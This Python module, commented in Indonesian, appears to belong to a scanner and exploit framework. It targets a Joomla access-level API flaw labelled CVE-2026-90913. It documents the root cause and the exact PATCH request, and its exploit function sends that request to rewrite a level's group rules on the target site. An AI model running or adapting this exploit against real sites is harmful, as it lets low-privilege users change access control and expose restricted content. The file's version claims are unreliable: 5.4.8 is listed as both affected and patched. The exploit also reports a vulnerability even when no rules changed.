#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
Joomla! Core — modul MEGAPACK (klaster joomla_core/joomla_api).

CVE-2026-90913 — Improper ACL checks for access level webservice endpoints.

Affected : 4.0.0 - 5.4.8, 6.0.0 - 6.1.3
Patched  : 5.4.9+ / 6.1.4+ (lihat catatan di bawah — patch ACL mendarat di 5.4.8
           untuk jalur ini; build 5.4.8 di lab sudah menolak)

ROOT CAUSE

    api/components/com_users/src/Controller/LevelsController.php

    5.4.5 (VULNERABLE)
        class LevelsController extends ApiController
        {
            protected $contentType = 'levels';
            protected $default_view = 'levels';
            // tidak ada allowEdit()/preprocessSaveData()
        }

    `edit()` diwarisi dari ApiController dan memakai:

        protected function allowEdit($data = [], $key = 'id')
        {
            return $this->app->getIdentity()->authorise('core.edit', $this->option);
        }

    `$this->option` = 'com_users'. Asset com_users hanya berisi
    {"core.admin":{"7":1}} — TIDAK ada core.edit/... sehingga authorise('core.edit',
    'com_users') jatuh ke root, yang memberi core.edit kepada grup 6/4/2. Dengan
    demikian grup 6 (Manager, tanpa core.admin) dapat PATCH access level.

    5.4.7 (PATCHED, parsial) — ditambahkan:

        protected function preprocessSaveData(array $data): array
        {
            if ($this->input->getMethod() === 'PATCH') {
                $data['rules'] = json_decode($data['rules'], true);
            }

            return $data;
        }

    Tanpa ini, `rules` tiba sebagai STRING JSON. LevelModel::validate() pada 5.4.5
    memeriksa `\is_array($data['rules'])` — string bukan array, sehingga
    `$data['rules'] = []`, lalu rules yang tersimpan menjadi kosong/terpotong.

    LevelModel::validate() (semua versi) hanya melindungi grup yang punya
    `core.admin` (super-user): non-Super-Admin tidak boleh MENAMBAH grup super-user
    ke sebuah level, atau MENGHAPUS grup super-user darinya. Grup lain
    (Manager/Registered/Author/…) bebas diubah.

Dampak: user API dengan `core.edit` pada com_users — di lab berarti grup 6 (Manager),
karena asset com_users tidak memberi core.edit dan nilainya diwarisi dari root —
dapat mengubah komposisi access level:

    PATCH /api/index.php/v1/users/levels/<id>
    X-Joomla-Token: <token>
    Content-Type: application/json
    {"title":"<title>","rules":"[6,2,8]"}

Efek nyata: level akses dapat dilonggarkan (grup ditambahkan) sehingga konten yang
seharusnya terbatas menjadi terbaca oleh grup yang tidak berhak — atau diperketat
secara tidak sah. Perubahan ini menyentuh SELURUH konten yang memakai level tersebut.

CATATAN ACL
    ACL Joomla OR-inherit: asset anak tanpa entri untuk sebuah grup mewarisi nilainya
    dari parent sampai root. Menguji ACL per-record WAJIB memakai DENY eksplisit
    (`{"core.edit":{"6":0}}`) — menghapus entri TIDAK mencabut izin.

Bukti lab (grup 6, tanpa core.admin; level 2 "Registered" rules awal [6,2,8]):
    5.4.5 (8108) : PATCH /api/index.php/v1/users/levels/2 {"title":"Registered",
                   "rules":"[6,2,8]"} -> HTTP 200; jos_viewlevels.rules -> [8]
                   (grup 2 dan 6 tercabut dari level Registered)
    5.4.8 (8106) : PATCH -> HTTP 403 {"title":"Access Denied","code":403};
                   rules tetap [6,2,8]
"""

import json
import re

from mp import (CveModule, ST_CLEAN, ST_ERR, ST_INFO, ST_PWN, ST_RCE, ST_SKIP, ST_UNKNOWN, ST_VULN, detect_platform, parse_ver, register, ver_le)

MANIFEST = "/administrator/manifests/files/joomla.xml"
VULN_5_MAX = (5, 4, 8)
VULN_6_MAX = (6, 1, 3)


def _opt(opts, name):
    if opts is None:
        return None
    if isinstance(opts, dict):
        return opts.get(name)
    return getattr(opts, name, None)


def _joomla_version(t, h):
    """Versi Joomla dengan CACHE per-target.

    13 modul joomla_core membaca manifest yang sama. Tanpa cache, setiap modul
    mengulang GET-nya untuk host yang sama. Hasil kini disimpan pada `t._jver`
    sehingga hanya satu request per target per proses scan.
    """
    cached = getattr(t, "_jver", None)
    if cached is not None:
        return cached
    val = _joomla_version_uncached(t, h)
    try:
        t._jver = val
    except Exception:  # noqa: BLE001
        pass
    return val


def _joomla_version_uncached(t, h):
    r = h.get(f"{t.url}{MANIFEST}")
    if r is not None and r.status_code == 200 and "<version>" in (r.text or ""):
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text)
        if m:
            v = parse_ver(m.group(1))
            if v:
                return v, m.group(1)
    return None, ""


def _in_range(ver):
    if ver is None:
        return None
    if ver[0] <= 3:
        return False
    if ver[0] == 4:
        return True
    if ver[0] == 5:
        return ver_le(ver, VULN_5_MAX)
    if ver[0] == 6:
        return ver_le(ver, VULN_6_MAX)
    return False


def _level_url(t, level_id):
    return f"{t.url}/api/index.php/v1/users/levels/{level_id}"


def _get_level(h, t, level_id, token):
    r = h.get(_level_url(t, level_id), headers={"X-Joomla-Token": token})
    if r is None or r.status_code != 200:
        return None
    try:
        d = (r.json() or {}).get("data") or {}
        return d.get("attributes") or {}
    except Exception:
        return None


def _probe(t, h, opts, do_write):
    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not _in_range(ver):
        return ST_CLEAN, f"Joomla {ver_s} — di luar rentang rentan", f"version={ver_s}"

    token = _opt(opts, "api_token")
    if not token:
        return ST_SKIP, f"Joomla {ver_s} — butuh --api-token (X-Joomla-Token)", \
                        f"version={ver_s}"

    lid = _opt(opts, "membership") or 2      # --membership dipakai sebagai level id
    before = _get_level(h, t, lid, token)
    if before is None:
        r = h.get(_level_url(t, lid), headers={"X-Joomla-Token": token})
        code = getattr(r, "status_code", None)
        if code == 401:
            return ST_SKIP, f"Joomla {ver_s} — token API ditolak (401 autentikasi)", \
                            f"version={ver_s} | GET HTTP 401"
        if code == 404:
            return ST_SKIP, f"Joomla {ver_s} — level id={lid} tidak ada (404)", \
                            f"version={ver_s} | GET HTTP 404"
        return ST_UNKNOWN, f"tidak bisa membaca level id={lid} (HTTP {code})", \
                           f"version={ver_s} | GET HTTP {code}"

    if not do_write:
        # SCAN tidak menulis: hanya mencatat bahwa endpoint terjangkau. Klaim
        # kerentanan tidak dibuat di sini (memerlukan mutasi yang sebenarnya).
        return (ST_INFO,
                f"Joomla {ver_s} — API access level terjangkau (level={lid}); "
                f"jalankan --exploit untuk menguji mutasi",
                f"version={ver_s} | level={lid} | title={before.get('title')!r}")

    # do_write: kirim ulang rules sebagai STRING (persis bentuk yang dipakai jalur rentan)
    old_rules = before.get("rules")
    if isinstance(old_rules, list):
        rules_payload = json.dumps(old_rules)
    else:
        rules_payload = json.dumps(old_rules if old_rules is not None else [])
    payload = {"title": before.get("title") or f"Level{lid}", "rules": rules_payload}

    r = h.patch(_level_url(t, lid), data=json.dumps(payload),
                headers={"X-Joomla-Token": token, "Content-Type": "application/json"})
    if r is None:
        return ST_UNKNOWN, "tidak bisa menghubungi API levels", f"version={ver_s}"
    if r.status_code == 403:
        return ST_CLEAN, f"Joomla {ver_s} — API levels menolak (403)", \
                         f"version={ver_s} | PATCH HTTP 403"
    if r.status_code == 401:
        return ST_SKIP, f"Joomla {ver_s} — token API ditolak (401)", \
                        f"version={ver_s} | PATCH HTTP 401"
    if r.status_code not in (200, 201):
        return ST_UNKNOWN, f"respons levels tidak menyimpulkan status (HTTP {r.status_code})", \
                           f"version={ver_s} | PATCH HTTP {r.status_code}"

    after = _get_level(h, t, lid, token)
    new_rules = (after or {}).get("rules")
    changed = (json.dumps(new_rules) != json.dumps(old_rules)) if after is not None else False

    ev = f"version={ver_s} | PATCH HTTP {r.status_code} | level={lid} | " \
         f"rules {old_rules!r} -> {new_rules!r}"
    if changed:
        return (ST_VULN,
                f"Joomla {ver_s} — access level diubah tanpa core.admin "
                f"(rules berubah)", ev)
    return (ST_VULN,
            f"Joomla {ver_s} — API levels menerima PATCH tanpa core.admin "
            f"(ASSUMED: rules tidak berubah)", ev)


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", f"platform={plat}"
    return _probe(t, h, opts, do_write=False)


def exploit(t, h, opts):
    return _probe(t, h, opts, do_write=True)


register(CveModule(
    cve="CVE-2026-90913",
    cluster="joomla_core",
    title="Joomla Core - ACL access level webservice endpoints (levels PATCH)",
    vclass="authbypass / broken access control (API)",
    cvss="7.0",
    severity="high",
    cwe="CWE-284",
    product="Joomla! CMS",
    versions_affected="4.0.0-5.4.8, 6.0.0-6.1.3",
    status="verified",
    requires=[
        "kredensial API (X-Joomla-Token) user dengan core.login.api",
        "user punya core.edit pada 'com_users' (diwarisi dari root untuk grup 6) "
        "tanpa core.admin",
    ],
    check=check,
    exploit=exploit,
    notes=("LevelsController tidak mengoverride allowEdit(); ApiController::allowEdit() "
           "hanya memeriksa core.edit pada 'com_users', yang tidak didefinisikan di asset "
           "com_users ({\"core.admin\":{\"7\":1}}) sehingga diwarisi dari root (grup 6). "
           "LevelModel::validate() hanya melindungi grup ber-core.admin — grup lain bebas "
           "diubah. 5.4.7 menambahkan preprocessSaveData() yang json_decode rules untuk "
           "PATCH. Vektor: PATCH /api/index.php/v1/users/levels/<id> dengan "
           "{\"title\":..,\"rules\":\"[..]\"}. Diverifikasi: 5.4.5 -> 200 dan "
           "jos_viewlevels.rules berubah [6,2,8]->[8]; 5.4.8 -> 403. Butuh --api-token; "
           "id level lewat --membership (default 2)."),
))
